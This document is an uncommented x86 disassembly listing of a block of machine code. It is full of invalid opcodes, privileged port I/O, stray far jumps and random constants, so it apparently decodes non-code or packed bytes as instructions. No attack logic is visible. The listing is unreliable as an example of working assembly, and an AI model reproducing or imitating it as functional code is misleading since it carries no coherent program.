  418d57:	jbe    0x418db9
  418d59:	mov    ebx,0x76c23289
  418d5e:	mov    bh,0x56
  418d60:	ins    BYTE PTR es:[edi],dx
  418d61:	pop    eax
  418d62:	cmc    
  418d63:	in     al,0x58
  418d65:	sbb    ah,BYTE PTR [edi-0x2fdcb5b7]
  418d6b:	mov    esp,0xc9eb1e45
  418d70:	jo     0x418dca
  418d72:	cmc    
  418d73:	pop    ebp
  418d74:	push   ss
  418d75:	jp     0x418d9a
  418d77:	arpl   WORD PTR [ecx-0x36],si
  418d7a:	cmp    eax,0x3c96c7c2
  418d7f:	sti    
  418d80:	idiv   BYTE PTR [edi]
  418d82:	out    0xf5,al
  418d84:	sub    DWORD PTR [edi+0x5b22be1f],ecx
  418d8a:	dec    esp
  418d8b:	mov    ds:0x36755f47,al
  418d90:	dec    esi
  418d91:	dec    esi
  418d93:	ret    0xeb83
  418d96:	and    BYTE PTR [ecx],bl
  418d98:	imul   eax,DWORD PTR [ebx],0xf1ae62f5
  418d9e:	sub    bl,bl
  418da0:	push   0xffffffc8
  418da2:	cdq    
  418da3:	lea    ecx,[eax-0x178353bf]
  418da9:	sbb    al,0xe2
  418dab:	xchg   DWORD PTR [edi],esp
  418dad:	pusha  
  418dae:	add    bh,dl
  418db0:	scas   eax,DWORD PTR es:[edi]
  418db1:	ins    BYTE PTR es:[edi],dx
  418db2:	scas   eax,DWORD PTR es:[edi]
  418db3:	shl    BYTE PTR [esi],0x30
  418db6:	mov    al,0x13
  418db8:	dec    ecx
  418db9:	pop    esp
  418dba:	(bad)  
  418dbc:	pop    edi
  418dbd:	mov    ds:0x7225a355,al
  418dc2:	out    dx,eax
  418dc3:	js     0x418de1
  418dc5:	ror    DWORD PTR [edx+0x23],cl
  418dc8:	inc    ebp
  418dc9:	arpl   WORD PTR [ebp+0x1c],ax
  418dcc:	sbb    eax,DWORD PTR [edx]
  418dce:	jae    0x418e2a
  418dd0:	jns    0x418e41
  418dd2:	cmp    DWORD PTR [ebp-0x35],ecx
  418dd5:	sub    esi,eax
  418dd7:	and    esi,DWORD PTR [eax-0xc]
  418dda:	(bad)  
  418ddb:	mov    al,ds:0x26875852
  418de0:	adc    DWORD PTR [ecx-0x38],0x51de4db1
  418de7:	outs   dx,DWORD PTR ds:[esi]
  418de8:	jle    0x418de9
  418dea:	mov    eax,ds:0x2698f7ae
  418def:	fisubr WORD PTR [ebp+0x43a9a4d4]
  418df5:	xchg   esp,eax
  418df6:	or     dl,BYTE PTR [esi+0x34]
  418df9:	mov    DWORD PTR [eax],edi
  418dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dfc:	mov    cl,0x2a
  418dfe:	dec    eax
  418dff:	(bad)  
  418e00:	data16 test BYTE PTR [ebx+0x7922bbe0],bh
  418e07:	std    
  418e08:	jmp    0x418da6
  418e0a:	out    0x74,al
  418e0c:	cli    
  418e0d:	outs   dx,DWORD PTR ds:[esi]
  418e0e:	mov    ebp,0x48682445
  418e13:	inc    ebp
  418e14:	cmp    eax,0xbadcd5fa
  418e19:	inc    edx
  418e1a:	repz pushf 
  418e1c:	sbb    eax,0x21b3989
  418e21:	mov    dh,0xc
  418e23:	xchg   esi,eax
  418e24:	push   esi
  418e25:	xor    DWORD PTR [edx+ebp*8+0x4cf30895],esp
  418e2c:	xor    esi,DWORD PTR [eax+edi*1-0x76]
  418e30:	repz call 0x7b623f0
  418e36:	dec    esp
  418e37:	(bad)  
  418e38:	es ret 0x3ad3
  418e3c:	aas    
  418e3d:	lahf   
  418e3e:	xlat   BYTE PTR gs:[ebx]
  418e40:	sub    eax,0xd8bb49a9
  418e45:	adc    eax,0x718ee7f
  418e4a:	rcr    DWORD PTR [edx+0x51],1
  418e4d:	out    dx,al
  418e4e:	sbb    dl,BYTE PTR [ebx+eiz*8-0x66d2ad5e]
  418e55:	xor    edx,0x2920a534
  418e5b:	rcl    BYTE PTR [esi+0x15],1
  418e5e:	push   0x6564119a
  418e63:	adc    eax,0x9fe58320
  418e68:	cmp    BYTE PTR [esi+0x79f1ca4e],0xc7
  418e6f:	retf   0x2310
  418e72:	pop    eax
  418e73:	fistp  QWORD PTR [edx-0x67583b49]
  418e79:	mov    dh,dh
  418e7b:	or     al,0xca
  418e7d:	pop    edi
  418e7e:	mov    ?,WORD PTR [eax-0x2a]
  418e81:	add    bh,BYTE PTR [ebp+ebx*4+0x26]
  418e85:	xchg   edx,eax
  418e86:	aad    0x7a
  418e88:	push   eax
  418e89:	sub    eax,0xae308b4e
  418e8e:	adc    ebx,esp
  418e90:	mov    ebp,0xb646c4a7
  418e95:	(bad)  
  418e96:	dec    ecx
  418e97:	inc    edi
  418e98:	fmul   DWORD PTR [eax]
  418e9a:	inc    ebx
  418e9b:	fcom   QWORD PTR [ebx-0x74]
  418e9e:	pop    edx
  418e9f:	mov    ebp,0x38c3ebe9
  418ea4:	xchg   DWORD PTR [edi],edx
  418ea6:	add    al,0x36
  418ea8:	xlat   BYTE PTR ds:[ebx]
  418ea9:	jns    0x418e89
  418eab:	ds aad 0xa4
  418eae:	jle    0x418f1e
  418eb0:	pop    esp
  418eb1:	xor    BYTE PTR [edi+eax*2],dh
  418eb4:	add    al,0x86
  418eb6:	xor    ah,ch
  418eb8:	ja     0x418f34
  418eba:	fnstsw WORD PTR [edx]
  418ebc:	xchg   ebx,eax
  418ebd:	and    DWORD PTR [edi-0x36],0xeb3c3c33
  418ec4:	das    
  418ec5:	jb     0x418f07
  418ec7:	pop    ebx
  418ec8:	add    ch,BYTE PTR [eax+0x3a]
  418ecb:	aad    0x51
  418ecd:	add    DWORD PTR [ebx+0x46e6dcae],0x778b32a8
  418ed7:	std    
  418ed8:	(bad)  
  418ed9:	call   0x880180c1
  418ede:	sub    DWORD PTR [eax+0x49],ecx
  418ee1:	and    eax,0x782801bc
  418ee6:	jmp    0x418ec8
  418ee8:	add    BYTE PTR [esi+0x3f],bl
  418eeb:	mov    cl,0x11
  418eed:	test   DWORD PTR [eax+0x1b],esi
  418ef0:	xor    edi,DWORD PTR [ebx+0x2e]
  418ef3:	mov    edx,0xa8371700
  418ef8:	xchg   ecx,eax
  418ef9:	sub    al,0xd4
  418efb:	push   DWORD PTR [ecx]
  418efd:	xor    eax,0x7ee2832d
  418f02:	retf   
  418f03:	rcl    BYTE PTR [ecx-0x1a],cl
  418f06:	sti    
  418f07:	les    esp,FWORD PTR fs:0xa54faa1b
  418f0e:	dec    ebp
  418f0f:	in     al,0x19
  418f11:	xchg   edi,eax
  418f12:	fild   QWORD PTR [edi+0x98f1a3a]
  418f18:	add    dl,BYTE PTR [ebx+0x4397f425]
  418f1e:	dec    esp
  418f1f:	mov    ebp,0xd5ece710
  418f24:	scas   eax,DWORD PTR es:[edi]
  418f25:	dec    BYTE PTR [edx]
  418f27:	test   eax,0x2a1601f6
  418f2c:	mov    ds:0xb110aa54,al
  418f31:	call   0x62bee2f8
  418f36:	int    0xc7
  418f38:	adc    al,dh
  418f3a:	sub    esp,DWORD PTR [esi]
  418f3c:	pop    ds
  418f3d:	push   es
  418f3e:	ss pop esi
  418f40:	je     0x418f00
  418f42:	jg     0x418f50
  418f44:	sahf   
  418f45:	leave  
  418f46:	push   es
  418f47:	inc    ecx
  418f48:	jl     0x418fa9
  418f4a:	push   cx
  418f4c:	dec    ebp
  418f4d:	das    
  418f4e:	dec    ebx
  418f4f:	popa   
  418f50:	test   DWORD PTR [ecx],ebp
  418f52:	add    DWORD PTR [edx-0x6800c6e2],edx
  418f58:	inc    edx
  418f59:	aam    0x48
  418f5b:	imul   ebx,edi,0xd07d7b55
  418f61:	je     0x418f44
  418f63:	add    eax,0x80bb5413
  418f68:	loop   0x418f6b
  418f6a:	int    0x53
  418f6c:	loop   0x418f77
  418f6e:	pop    edx
  418f6f:	push   eax
  418f70:	and    DWORD PTR [ecx],ecx
  418f72:	out    dx,eax
  418f73:	xchg   ecx,eax
  418f74:	push   esi
  418f75:	cdq    
  418f76:	and    bh,BYTE PTR [ebx+0x3d]
  418f79:	push   esp
  418f7a:	shl    BYTE PTR [ebp+0x1b888975],1
  418f80:	and    eax,0xd658f59b
  418f85:	jbe    0x418fc9
  418f87:	jno    0x418fae
  418f89:	(bad)  
  418f8a:	pop    edx
  418f8b:	cs push cs
  418f8d:	mov    dh,0x57
  418f8f:	clc    
  418f90:	dec    eax
  418f91:	mov    dl,0x22
  418f93:	jge    0x418f96
  418f95:	mov    al,0x8a
  418f97:	ja     0x418fdd
  418f99:	adc    eax,0x968b0c6d
  418f9e:	mov    al,0xf8
  418fa0:	jnp    0x418f54
  418fa2:	call   0xfd59:0xeec7b539
  418fa9:	inc    ebx
  418faa:	xor    dh,BYTE PTR [ebp-0x4c]
  418fad:	les    edi,FWORD PTR [eax]
  418faf:	cmp    eax,0x5cf0ece4
  418fb4:	pop    ecx
  418fb5:	fwait
  418fb6:	mov    al,ds:0xbc63da7f
  418fbb:	mov    esi,0xa1c83968
  418fc0:	and    ebp,edi
  418fc2:	cdq    
  418fc3:	dec    eax
  418fc4:	das    
  418fc5:	test   DWORD PTR [edi+0x8],0x793acf0b
  418fcc:	sbb    bl,dl
  418fce:	xchg   edx,eax
  418fcf:	push   cs
  418fd0:	dec    ebp
  418fd1:	adc    eax,0x5d44d024
  418fd6:	xor    al,0x0
  418fd8:	daa    
  418fd9:	inc    edx
  418fda:	sahf   
  418fdb:	loop   0x41903a
  418fdd:	mov    bl,0x21
  418fdf:	icebp  
  418fe0:	jae    0x41902a
  418fe2:	aas    
  418fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fe4:	add    BYTE PTR [ebx-0x6ed849ba],dl
  418fea:	add    edx,edx
  418fec:	std    
  418fed:	xchg   BYTE PTR [ebx],al
  418fef:	or     eax,0xe0b0329d
  418ff4:	cmp    eax,0xea984130
  418ff9:	or     al,0x17
  418ffb:	out    dx,eax
  418ffc:	fwait
  418ffd:	sub    BYTE PTR [ebp-0x56],0x2d
  419001:	inc    esp
  419002:	bound  edx,QWORD PTR [ebp+ebx*1+0x20092ad1]
  419009:	loop   0x41907f
  41900b:	mov    ds:0x1432777a,al
  419010:	jg     0x419056
  419012:	sbb    eax,0x7ba0109c
  419017:	sti    
  419018:	pop    esp
  419019:	or     al,0x26
  41901b:	pop    es
  41901c:	push   cs
  41901d:	push   0xffffffeb
  41901f:	push   eax
  419020:	adc    al,0xe7
  419022:	stc    
  419023:	pop    ecx
  419024:	fwait
  419025:	adc    eax,0xfc4f87ea
  41902a:	cli    
  41902b:	dec    ecx
  41902c:	xchg   edi,eax
  41902d:	inc    ecx
  41902e:	mov    ebx,0xf8bd89c7
  419033:	jno    0x419036
  419035:	stos   DWORD PTR es:[edi],eax
  419036:	out    0x4c,eax
  419038:	mov    dh,0x13
  41903a:	sbb    DWORD PTR [esi],edi
  41903c:	or     al,0x77
  41903e:	or     al,0x30
  419040:	test   BYTE PTR [edx],dh
  419042:	retf   0x70c9
  419045:	ret    
  419046:	inc    ebx
  419047:	or     eax,0xe45d5b98
  41904c:	xchg   edx,eax
  41904d:	es loope 0x419024
  419050:	jbe    0x41900a
  419052:	into   
  419053:	aad    0x43
  419055:	jge    0x41902b
  419057:	ds es mov edx,0x53376695
  41905e:	mov    dh,0xd2
  419060:	sahf   
  419061:	ror    DWORD PTR [ebx-0x52],0xa
  419065:	sahf   
  419066:	inc    ecx
  419067:	xchg   edx,eax
  419068:	adc    ecx,edx
  41906a:	ins    DWORD PTR es:[edi],dx
  41906b:	jnp    0x419093
  41906d:	int3   
  41906e:	in     eax,dx
  41906f:	mov    edx,0xb402d7ab
  419074:	(bad)  
  419075:	and    dl,BYTE PTR [edi+0x740823cc]
  41907b:	lds    edi,FWORD PTR [ebx+edx*4+0x6a]
  41907f:	into   
  419080:	jno    0x4190fb
  419082:	mov    bl,0xd4
  419084:	test   eax,0x2a7137d9
  419089:	mov    ds:0x80b1bde2,eax
  41908e:	sub    BYTE PTR [ebp-0x5a],al
  419091:	and    eax,0xd826d185
  419096:	lock es xchg esi,eax
  419099:	inc    ecx
  41909a:	xchg   edx,eax
  41909b:	les    ebx,FWORD PTR [ecx]
  41909d:	bound  esp,QWORD PTR [ebx+eiz*1]
  4190a0:	push   ecx
  4190a1:	jg     0x419057
  4190a3:	dec    esi
  4190a4:	fisubr DWORD PTR [eax-0x1d92b3a7]
  4190aa:	sub    eax,0x96e654f2
  4190af:	jl     0x4190c9
  4190b1:	shl    DWORD PTR [esi-0x399353a2],0xa3
  4190b8:	clc    
  4190b9:	jecxz  0x4190b6
  4190bb:	mov    dl,0x29
  4190bd:	lahf   
  4190be:	out    dx,eax
  4190bf:	pop    ebp
  4190c0:	add    ebx,DWORD PTR [edi+0xf]
  4190c3:	adc    al,BYTE PTR [esi]
  4190c5:	jmp    0x419109
  4190c7:	adc    al,BYTE PTR [edx+0x7]
  4190ca:	jbe    0x419062
  4190cc:	jp     0x4190b0
  4190ce:	int    0xf5
  4190d0:	repz enter 0x2ba5,0xd9
  4190d5:	mov    dh,0x54
  4190d7:	dec    ebx
  4190d8:	loope  0x419080
  4190da:	mov    edx,0x8a3da504
  4190df:	dec    edi
  4190e0:	sbb    DWORD PTR [ebx+0x72],eax
  4190e3:	sbb    al,BYTE PTR [edx+0x58]
  4190e6:	popa   
  4190e7:	mov    cl,0xb4
  4190e9:	and    al,0xb2
  4190eb:	call   0xfb606faa
  4190f0:	lahf   
  4190f1:	in     eax,dx
  4190f2:	mov    ecx,0xeb909905
  4190f7:	cmp    bl,BYTE PTR [ecx]
  4190f9:	call   0x7fbb166c
  4190fe:	add    ebx,DWORD PTR [ecx]
  419100:	repz sub esi,eax
  419103:	ins    BYTE PTR es:[edi],dx
  419104:	(bad)  
  419105:	sti    
  419106:	sub    BYTE PTR [eax+0x51],bh
  419109:	sub    al,0x9e
  41910b:	shr    BYTE PTR [ebx],0x2c
  41910e:	in     al,dx
  41910f:	hlt    
  419110:	lods   al,BYTE PTR ds:[esi]
  419111:	fisttp QWORD PTR [ebp-0x1e39b30b]
  419117:	sbb    al,0x61
  419119:	pusha  
  41911a:	sbb    DWORD PTR [eax],0x7548074
  419120:	mov    DWORD PTR ds:0x8a944e95,esp
  419126:	retf   
  419127:	jns    0x41913f
  419129:	mov    bl,BYTE PTR [eax+esi*8]
  41912c:	jle    0x4190f7
  41912e:	mov    ebp,0xbb7f1429
  419133:	das    
  419134:	les    ecx,FWORD PTR [edi-0x44]
  419137:	ficom  DWORD PTR [eax+0x71f952ff]
  41913d:	clc    
  41913e:	jnp    0x4190c6
  419140:	cmp    dh,BYTE PTR [edx]
  419142:	xchg   ecx,eax
  419143:	mov    ebx,DWORD PTR [edi-0x11]
  419146:	xchg   edi,eax
  419147:	add    al,0xad
  419149:	xchg   edx,eax
  41914a:	ja     0x419187
  41914c:	iret   
  41914d:	loope  0x41916e
  41914f:	repnz cld 
  419151:	lock or eax,0x31a2aec4
  419157:	es ja  0x419193
  41915a:	xor    al,0xf4
  41915c:	add    edi,ebx
  41915e:	mov    esi,DWORD PTR fs:[edi+ebp*4]
  419162:	outs   dx,BYTE PTR ds:[esi]
  419163:	ss in  eax,0x62
  419166:	jle    0x41919b
  419168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419169:	ror    DWORD PTR [edi],1
  41916b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41916c:	test   edx,ebp
  41916e:	jmp    0xfc70:0x5f004c70
  419175:	or     BYTE PTR [ebx-0x4],cl
  419178:	mov    cl,0xb1
  41917a:	mov    eax,ds:0x6e021f00
  41917f:	rol    DWORD PTR [ebx-0x25],0x99
  419183:	es jge 0x4191e4
  419186:	mov    al,0xd5
  419188:	mov    esp,0x7b2919c1
  41918d:	cmp    DWORD PTR [ecx],esi
  41918f:	pcmpeqw mm3,mm6
  419192:	nop
  419193:	retf   0x20f7
  419196:	lahf   
  419197:	lea    eax,[edx+0x0]
  41919a:	or     eax,0xe430163f
  41919f:	xchg   esi,eax
  4191a0:	retf   
  4191a1:	cmp    bh,BYTE PTR [edx]
  4191a3:	rcl    DWORD PTR [edi],1
  4191a5:	shl    BYTE PTR [edi],0xbc
  4191a8:	jle    0x4191c2
  4191aa:	fsub   QWORD PTR [ebx-0x28]
  4191ad:	sbb    DWORD PTR [ebp+0x55a6ac7a],ecx
  4191b3:	dec    edi
  4191b4:	mov    eax,0x585e5082
  4191b9:	inc    esi
  4191ba:	cwde   
  4191bb:	jmp    DWORD PTR [eax*1+0x3e0e8af1]
  4191c2:	repz dec ecx
  4191c4:	push   edx
  4191c5:	sbb    eax,0x8df33baa
  4191ca:	repnz sti 
  4191cc:	std    
  4191cd:	jmp    0x3249:0x80dc623d
  4191d4:	fs retf 0xf58b
  4191d8:	add    BYTE PTR [ecx],ah
  4191da:	pop    es
  4191db:	push   DWORD PTR [edi]
  4191dd:	ds dec ecx
  4191df:	pop    ebx
  4191e0:	mov    cl,0x8a
  4191e2:	jmp    0x7089:0x18ce0123
  4191e9:	sub    BYTE PTR [esi-0x7d2ecbf2],cl
  4191ef:	add    BYTE PTR [ebp+0x16],ch
  4191f2:	sub    esi,ebx
  4191f4:	fidivr DWORD PTR [ecx-0x4b]
  4191f7:	xor    eax,0xc7e25cd2
  4191fc:	lods   eax,DWORD PTR ds:[esi]
  4191fd:	jmp    0x84ffd56c
  419202:	stc    
  419203:	sbb    DWORD PTR [eax+edi*4-0x11],ebx
  419207:	jo     0x4191c4
  419209:	xor    ebx,DWORD PTR [ebx-0x27]
  41920c:	mov    edx,0x577720ce
  419211:	pop    ebx
  419212:	xchg   BYTE PTR [edi-0x72],bh
  419215:	imul   ebp,DWORD PTR ds:0x72eba702,0x73
  41921c:	aas    
  41921d:	(bad)  
  41921e:	cwde   
  41921f:	xor    dh,ah
  419221:	and    eax,0xce24f51e
  419226:	push   0xc3a523c0
  41922b:	out    dx,eax
  41922c:	jno    0x419218
  41922e:	mov    dh,0xa6
  419230:	adc    dh,BYTE PTR [ecx+0x75]
  419233:	dec    esp
  419234:	jecxz  0x4191f0
  419236:	mov    ds:0xccc2fc7b,al
  41923b:	jmp    0x5f55:0xb88a8c5a
  419242:	js     0x419206
  419244:	fsubr  DWORD PTR [ecx-0x78]
  419247:	cmp    dl,BYTE PTR [edx+0x757cdb6e]
  41924d:	(bad)  
  41924e:	in     al,0x22
  419250:	mov    ch,0x5
  419252:	or     ah,BYTE PTR [eax]
  419254:	fbstp  TBYTE PTR [eax-0x67524efe]
  41925a:	dec    ah
  41925c:	pop    ecx
  41925d:	or     ecx,esi
  41925f:	dec    ebx
  419260:	adc    al,0xe8
  419262:	inc    edx
  419263:	cmp    DWORD PTR [edi],0xffffff9f
  419266:	mov    ebx,0xf9f1056d
  41926b:	dec    esi
  41926c:	outs   dx,DWORD PTR ds:[esi]
  41926d:	sub    edx,ecx
  41926f:	rcl    BYTE PTR [eax],cl
  419271:	hlt    
  419272:	sbb    edi,edx
  419274:	jl     0x4191fb
  419276:	ja     0x41924f
  419278:	adc    al,0xf6
  41927a:	xchg   edi,eax
  41927b:	adc    ebp,ebx
  41927d:	add    cl,ah
  41927f:	inc    ebx
  419280:	gs cli 
  419282:	call   0x9c31:0x4934f434
  419289:	int    0xeb
  41928b:	ins    DWORD PTR es:[edi],dx
  41928c:	pop    ebp
  41928d:	mov    esi,0x757b5e0
  419292:	mov    ss:0x633755be,eax
  419298:	hlt    
  419299:	cmp    dh,0x24
  41929c:	add    ah,BYTE PTR [eax+0x3d92c9b4]
  4192a2:	sbb    al,BYTE PTR [eax+0x68]
  4192a5:	mov    cl,0x34
  4192a7:	out    0xbf,al
  4192a9:	sbb    DWORD PTR [edx+0x34090e23],edx
  4192af:	sbb    al,bh
  4192b1:	mov    al,ds:0x1f82caa9
  4192b6:	fisub  DWORD PTR [ebp-0x33]
  4192b9:	das    
  4192ba:	mov    edx,0x55510339
  4192bf:	sbb    eax,0xf97e618f
  4192c4:	mov    bl,0xc1
  4192c6:	ins    DWORD PTR es:[edi],dx
  4192c7:	push   ss
  4192c8:	cmp    al,BYTE PTR [esi-0x10]
  4192cb:	loop   0x419274
  4192cd:	sub    DWORD PTR [esi-0x30],ebp
  4192d0:	jnp    0x4192d2
  4192d2:	ins    BYTE PTR es:[edi],dx
  4192d3:	rcl    BYTE PTR [esi-0x47fb7f9e],cl
  4192d9:	jecxz  0x4192a1
  4192db:	inc    eax
  4192dc:	cmp    ecx,0x7d554b6
  4192e2:	outs   dx,BYTE PTR ds:[esi]
  4192e3:	das    
  4192e4:	xor    esp,DWORD PTR [esi+eiz*8-0x2a]
  4192e8:	mov    esi,DWORD PTR [edx+eax*2+0x49]
  4192ec:	jg     0x419319
  4192ee:	fcom   DWORD PTR [esi-0x39674436]
  4192f4:	daa    
  4192f5:	push   es
  4192f6:	call   0x18d9:0xed0c2cd9
  4192fd:	pusha  
  4192fe:	pop    edi
  4192ff:	imul   edi,ebx,0x6e
  419302:	aam    0x99
  419304:	pop    esp
  419305:	outs   dx,DWORD PTR ds:[esi]
  419306:	pusha  
  419307:	(bad)  
  419308:	cmp    bh,ah
  41930a:	out    dx,al
  41930b:	xor    al,0xee
  41930d:	push   ecx
  41930e:	jg     0x419368
  419310:	lds    ebx,FWORD PTR [esi+0x14]
  419313:	xor    BYTE PTR [esi],dh
  419315:	pop    ebx
  419316:	xlat   BYTE PTR ds:[ebx]
  419317:	xchg   ecx,eax
  419318:	mov    ebp,0x31264868
  41931d:	or     al,0x8f
  41931f:	ret    0x2308
  419322:	dec    ecx
  419323:	lods   al,BYTE PTR ds:[esi]
  419324:	dec    edx
  419325:	push   0xfffffff3
  419327:	shl    ebp,cl
  419329:	cmp    ebp,DWORD PTR [ebx+0x55]
  41932c:	inc    ebp
  41932d:	in     al,dx
  41932e:	(bad)  
  41932f:	add    ebx,DWORD PTR [ebp+0x672f114]
  419335:	push   0xffffffc0
  419337:	add    eax,0x4f504d3f
  41933c:	jns    0x4193ba
  41933e:	loopne 0x41934c
  419340:	sub    al,0x12
  419342:	sahf   
  419343:	xor    eax,0x11ef63d
  419348:	xor    esi,DWORD PTR [ebx-0x54]
  41934b:	xor    BYTE PTR [ebx],ch
  41934d:	mov    ah,0x87
  41934f:	inc    ebp
  419350:	jecxz  0x419382
  419352:	retf   
  419353:	into   
  419354:	adc    bh,0x3c
  419357:	es adc al,0x65
  41935a:	mov    DWORD PTR [esi],ecx
  41935c:	std    
  41935d:	fisttp QWORD PTR gs:[edx]
  419360:	sbb    BYTE PTR [esi],dl
  419362:	mov    WORD PTR [edi+0x58],?
  419365:	cmp    BYTE PTR [edi-0x27],0x21
  419369:	ds dec eax
  41936b:	imul   ebx,DWORD PTR [ebx],0x29
  41936e:	pop    ebp
  41936f:	push   cs
  419370:	outs   dx,DWORD PTR ds:[esi]
  419371:	pop    es
  419372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419373:	arpl   di,bp
  419375:	pop    ebx
  419376:	pop    edi
  419377:	scas   al,BYTE PTR es:[edi]
  419378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419379:	push   0xf1d36f1f
  41937e:	in     eax,dx
  41937f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419380:	and    eax,0xd252177e
  419385:	mov    eax,ds:0x5ff68c82
  41938a:	jnp    0x4193de
  41938c:	and    DWORD PTR [ebx],ecx
  41938e:	push   0x1b
  419390:	fdivr  st(4),st
  419392:	xor    al,0xb4
  419394:	(bad)  
  419396:	fnstcw WORD PTR [esp+eax*4-0x410bf8b1]
  41939d:	div    BYTE PTR [esi-0x38503387]
  4193a3:	ret    0xc25e
  4193a6:	jge    0x419387
  4193a8:	pushf  
  4193a9:	cwde   
  4193aa:	sbb    ebp,DWORD PTR [edi]
  4193ac:	cmp    DWORD PTR [ebx],esp
  4193ae:	mov    ah,0xc9
  4193b0:	pop    edi
  4193b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193b3:	push   ebp
  4193b4:	hlt    
  4193b5:	mov    ah,0xa8
  4193b7:	add    al,0x2d
  4193b9:	inc    edx
  4193ba:	or     dl,BYTE PTR [eax]
  4193bc:	pop    ebx
  4193bd:	into   
  4193be:	ds popf 
  4193c0:	inc    ebp
  4193c1:	mov    edx,0xfba06d70
  4193c6:	js     0x41941d
  4193c8:	stc    
  4193c9:	(bad)  
  4193ca:	aam    0x12
  4193cc:	cdq    
  4193cd:	pusha  
  4193ce:	aas    
  4193cf:	neg    dh
  4193d1:	jmp    0xf688d029
  4193d6:	js     0x419422
  4193d8:	pop    es
  4193d9:	loope  0x4193ab
  4193db:	leave  
  4193dc:	cmc    
  4193dd:	mov    esp,0x990d1259
  4193e2:	jp     0x41940a
  4193e4:	inc    ecx
  4193e5:	sub    dh,cl
  4193e7:	outs   dx,BYTE PTR ds:[esi]
  4193e8:	mov    WORD PTR [ecx],?
  4193ea:	pop    ss
  4193eb:	xlat   BYTE PTR ds:[ebx]
  4193ec:	jmpw   0x37c6
  4193f0:	jle    0x41944b
  4193f2:	imul   ecx,DWORD PTR [esi+ebp*2+0x1ff9468e],0xffffffb0
  4193fa:	inc    ebx
  4193fb:	mov    ecx,0x7b12e74
  419400:	mov    ebp,0x5de221a1
  419405:	push   0xffffffc7
  419407:	pushf  
  419408:	inc    ebp
  419409:	(bad)
  41940d:	fs dec esi
  41940f:	xchg   DWORD PTR [eax-0x21],ecx
  419412:	and    eax,0xba60ed98
  419417:	out    dx,eax
  419418:	and    al,0xf6
  41941a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41941b:	into   
  41941c:	push   ds
  41941d:	xor    eax,0x3da6e2e3
  419422:	sbb    eax,0x20c50cf1
  419427:	mov    ds:0xd9200191,eax
  41942c:	push   ebx
  41942d:	xor    DWORD PTR [eax-0x35],esi
  419430:	stc    
  419431:	out    dx,eax
  419432:	jmp    0x419481
  419434:	inc    eax
  419435:	fnsave [eax]
  419437:	pop    ecx
  419438:	into   
  419439:	mov    eax,ds:0x82d494db
  41943e:	inc    ebp
  41943f:	pop    esp
  419440:	adc    esp,eax
  419442:	clc    
  419443:	sahf   
  419444:	jle    0x4193f3
  419446:	inc    ebx
  419447:	aad    0xdf
  419449:	sahf   
  41944a:	mov    esi,0x5e471a46
  41944f:	mov    dh,0x40
  419451:	popf   
  419452:	ss push ebp
  419454:	fild   DWORD PTR [ecx+0x105c3db2]
  41945a:	icebp  
  41945b:	stos   DWORD PTR es:[edi],eax
  41945c:	mov    al,ds:0xebe0d635
  419461:	mov    bl,0xef
  419463:	mov    edx,DWORD PTR [ecx+0x38]
  419466:	xchg   esi,eax
  419467:	mov    ch,0xf2
  419469:	sub    ebp,DWORD PTR [eax-0x6069e7ff]
  41946f:	mov    al,0xab
  419471:	adc    eax,0x506eb91d
  419476:	or     eax,0x8efc873b
  41947b:	mov    DWORD PTR [ebx],ebp
  41947d:	loope  0x41944a
  41947f:	jl     0x4194d0
  419481:	icebp  
  419482:	stos   DWORD PTR es:[edi],eax
  419483:	ror    ebx,cl
  419485:	mov    eax,DWORD PTR ds:0x3b437900
  41948b:	push   eax
  41948c:	sar    al,cl
  41948e:	cmp    eax,0x208cf4cd
  419493:	daa    
  419494:	nop
  419495:	(bad)  
  419496:	push   ebp
  419497:	jne    0x419467
  419499:	retf   0xa859
  41949c:	sub    eax,0x978c6c3a
  4194a1:	xchg   esi,eax
  4194a2:	dec    ebp
  4194a3:	push   es
  4194a4:	pop    edx
  4194a5:	pop    ss
  4194a6:	adc    BYTE PTR [edx],cl
  4194a8:	or     al,0xae
  4194aa:	sbb    DWORD PTR [eax-0x6],edi
  4194ad:	push   cs
  4194ae:	mov    DWORD PTR [eax],esp
  4194b0:	pop    edx
  4194b1:	cld    
  4194b2:	rol    esi,0xa2
  4194b5:	pop    eax
  4194b6:	dec    esi
  4194b7:	in     al,0x84
  4194b9:	jbe    0x419491
  4194bb:	xor    eax,0x47d98157
  4194c0:	rcr    BYTE PTR [eax-0x7d],0x4f
  4194c4:	pop    esi
  4194c5:	sub    bl,BYTE PTR ds:0x625b2025
  4194cb:	mov    esi,0xe4d2e3e1
  4194d0:	pop    ecx
  4194d1:	push   esp
  4194d2:	sub    bl,BYTE PTR [esi+0x30455a68]
  4194d8:	dec    edx
  4194d9:	inc    ebp
  4194da:	xchg   edi,eax
  4194db:	(bad)  
  4194dc:	les    esi,FWORD PTR [edi]
  4194de:	sar    DWORD PTR [ebp+edi*1-0x9f3c4f0],0x73
  4194e6:	xchg   edi,eax
  4194e7:	repz (bad) 
  4194e9:	push   edx
  4194ea:	pushf  
  4194eb:	xchg   ebx,eax
  4194ec:	mov    esi,DWORD PTR [esi+0x22c8aed0]
  4194f2:	sbb    edi,esp
  4194f4:	int    0xe9
  4194f6:	and    esi,DWORD PTR [ebx-0x6c20220e]
  4194fc:	adc    esp,edi
  4194fe:	inc    eax
  4194ff:	call   0x8fac5b23
  419504:	jp     0x419523
  419506:	and    cl,BYTE PTR [ecx]
  419508:	in     al,0xb9
  41950a:	es pop edi
  41950c:	ror    dl,cl
  41950e:	push   edi
  41950f:	add    DWORD PTR [ebp-0x518318fe],0x36833c29
  419519:	push   ebp
  41951a:	xor    ch,BYTE PTR [edi-0x178ac47c]
  419520:	xchg   ebx,eax
  419521:	int    0x8d
  419523:	push   ss
  419524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419525:	aas    
  419526:	mov    esi,0xe720627b
  41952b:	mov    ecx,0x995176b5
  419530:	mov    bh,0xbd
  419532:	stos   BYTE PTR es:[edi],al
  419533:	cmp    al,0x38
  419535:	push   ds
